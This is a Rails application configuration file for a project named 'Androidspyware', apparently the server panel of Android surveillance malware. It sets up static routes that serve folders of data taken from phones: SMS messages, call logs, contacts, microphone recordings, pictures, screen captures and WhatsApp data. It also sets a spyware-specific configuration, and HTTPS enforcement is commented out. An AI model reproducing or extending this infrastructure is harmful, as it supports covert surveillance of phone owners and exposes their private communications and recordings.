require_relative "boot"

require "rails/all"

# Require the gems listed in Gemfile, including any gems
# you've limited to :test, :development, or :production.
Bundler.require(*Rails.groups)

module Androidspyware
  class Application < Rails::Application
    # Initialize configuration defaults for originally generated Rails version.
    config.load_defaults 6.0
    config.spyware_config = config_for(:spyware_config)
    config.web_console.whiny_requests = false
    config.serve_static_files = true
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("sms_messages_dumps").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("calllogs_dumps").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("contacts_dumps").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("microphone_recs").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("pictures").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("screen_snaps").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}
    config.middleware.use ::ActionDispatch::Static, Rails.root.join("files").join("dumps").join("whatsapp").to_s,
                          index: config.public_file_server.index_name, headers: config.public_file_server.headers || {}

    #config.force_ssl = true

    # Settings in config/environments/* take precedence over those specified here.
    # Application configuration can go into files in config/initializers
    # -- all .rb files in that directory are automatically loaded after loading
    # the framework and any gems in your application.
  end
end
